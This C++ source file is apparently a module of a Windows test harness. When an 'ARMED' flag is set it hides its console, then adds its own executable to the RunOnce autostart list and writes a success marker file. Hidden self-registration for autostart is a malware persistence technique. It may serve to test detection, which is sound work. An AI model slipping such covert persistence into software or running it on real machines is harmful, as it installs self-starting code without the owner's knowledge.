#include "pch.h"
#include "autostart/autostart.h"
#include "../filetest.h"

int main() {
	if constexpr (ARMED) FreeConsole();

	TCHAR location[MAX_PATH];
	GetModuleFileName(NULL, location, MAX_PATH);

	bool success = false;
	
	switch (fcom::check(FCOM_AUTOSTART)) {
	case 0: success = autostart::addto_runonce(location); break;
	default: success = false; break;
	}

	if (success) fcom::create(FCOM_AUTOSTART_SUCCESS, 0);
	
	return 0;
}
